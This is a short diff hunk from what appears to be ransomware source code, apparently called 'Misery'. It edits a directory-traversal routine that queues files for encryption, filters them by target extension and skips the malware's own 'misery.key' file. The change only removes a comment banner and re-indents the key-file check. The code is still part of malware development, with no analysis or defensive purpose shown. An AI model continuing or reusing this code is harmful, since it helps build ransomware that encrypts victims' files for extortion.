@@ -464,17 +464,16 @@ static void TraverseInternal(FILEOPS_CTX *ctx, const WCHAR *dir, int depth) {
                 EnqueueFile(ctx, full);
 
             } else {
-                /* ══════════════════════════════════════════
-                 * ENCRYPT TRAVERSE: target extensions only
-                 * ══════════════════════════════════════════ */
+                
 
                 /* CRITICAL: Never encrypt misery.key */
-                const char *fname = strrchr(narrow, '\\');
-                if (!fname) fname = narrow; else fname++;
-                if (_stricmp(fname, "misery.key") == 0) {
-                    MiseryLog(MISERY_LOG_INFO, "FileOps: Skipping key file: %s", narrow);
-                    continue;
-                }
+
+                 const char *fname = strrchr(narrow, '\\');
+                 if (!fname) fname = narrow; else fname++;
+                 if (_stricmp(fname, "misery.key") == 0) {
+                     MiseryLog(MISERY_LOG_INFO, "FileOps: Skipping key file: %s", narrow);
+                      continue;
+                 }
 
                 if (!IsTargetExtension(narrow)) continue;
 
